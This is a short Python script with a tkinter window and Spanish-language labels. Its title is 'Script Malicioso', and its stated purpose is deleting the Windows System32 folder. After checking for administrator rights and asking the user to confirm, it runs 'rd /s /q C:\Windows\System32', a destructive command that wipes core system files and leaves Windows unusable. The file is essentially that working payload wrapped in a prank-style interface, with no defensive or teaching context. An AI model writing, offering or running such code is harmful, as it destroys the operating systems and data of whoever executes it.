import tkinter as tk
from tkinter import messagebox
import os
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def borrar_system32():
    if is_admin():
        os.system("rd /s /q C:\\Windows\\System32")
        print("La carpeta System32 ha sido borrada!")
        root.destroy()  # Cierra la ventana cuando se hace clic en "Comenzar"
    else:
        messagebox.showerror("Error", "Se requieren privilegios de administrador para ejecutar esta acción.")

def comenzar():
    respuesta = messagebox.askyesno("Confirmación", "¿Estás seguro de que quieres borrar la carpeta System32?")
    if respuesta:
        borrar_system32()

def salir():
    print("Saliendo...")
    root.destroy()

root = tk.Tk()
root.title("Script Malicioso")
root.geometry("400x200")

etiqueta_texto = tk.Label(root, text="¿Preparado para borrar la carpeta System32?")
etiqueta_texto.pack()

boton_comenzar = tk.Button(root, text="Comenzar", command=comenzar)
boton_comenzar.pack()

boton_salir = tk.Button(root, text="Salir", command=salir)
boton_salir.pack()

root.mainloop()
